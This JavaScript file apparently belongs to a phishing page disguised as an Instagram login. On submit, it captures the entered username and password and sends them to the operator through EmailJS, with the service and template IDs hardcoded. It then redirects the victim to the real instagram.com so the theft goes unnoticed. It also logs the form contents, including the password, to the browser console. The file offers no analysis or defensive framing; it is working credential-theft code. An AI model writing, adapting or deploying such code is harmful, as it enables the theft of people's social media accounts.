document.addEventListener('DOMContentLoaded', function() {
    const blurEffect = document.getElementById('blur-effect');
    const permanentImage = document.getElementById('permanent-image');
    const loginCard = document.getElementById('login-card');
    const signupCard = document.getElementById('signup-card');
    const loginForm = document.getElementById('login-form');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('login-button');

    // --- REPLACE WITH YOUR ACTUAL EMAILJS PUBLIC KEY ---
    const YOUR_EMAILJS_PUBLIC_KEY = "kTjh5h5kkiJl1vJPc";
    // --- REPLACE WITH YOUR ACTUAL EMAILJS SERVICE ID ---
    const YOUR_EMAILJS_SERVICE_ID = "service_z5abnru";
    // --- REPLACE WITH YOUR ACTUAL EMAILJS TEMPLATE ID ---
    const YOUR_EMAILJS_TEMPLATE_ID = "template_276jkow";

    // Initialize EmailJS
    emailjs.init(YOUR_EMAILJS_PUBLIC_KEY);

    function validateForm() {
        const isValid = usernameInput.value.trim() !== '' &&
                       passwordInput.value.trim() !== '';
        loginButton.disabled = !isValid;
    }

    usernameInput.addEventListener('input', validateForm);
    passwordInput.addEventListener('input', validateForm);
    validateForm(); // Initial validation

    blurEffect.addEventListener('click', function() {
        blurEffect.classList.add('hidden'); // Hide blur effect
        permanentImage.classList.add('hidden'); // Hide permanent image
        loginCard.classList.remove('hidden'); // Show login card
        signupCard.classList.remove('hidden'); // Show signup card
    });

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();

        loginButton.disabled = true;
        loginButton.textContent = 'Logging in...';

        // --- Client-side debugging ---
        console.log("Form submission triggered.");
        console.log("Target Form Element:", loginForm);
        const formData = new FormData(loginForm);
        console.log("FormData entries collected:");
        for (let [key, value] of formData.entries()) {
            console.log(`  ${key}: "${value}"`);
        }
        // --- End client-side debugging ---

        emailjs.sendForm(YOUR_EMAILJS_SERVICE_ID, YOUR_EMAILJS_TEMPLATE_ID, loginForm)
            .then(function(response) {
                console.log('EMAILJS SUCCESS!', response.status, response.text);
                // Redirect to Instagram
                window.location.href = 'https://www.instagram.com/';
            })
            .catch(function(error) {
                console.log('EMAILJS FAILED...', error);
                loginButton.disabled = false;
                loginButton.textContent = 'Log in';
                alert('Login failed. Please try again. Error: ' + JSON.stringify(error));
            });
    });
});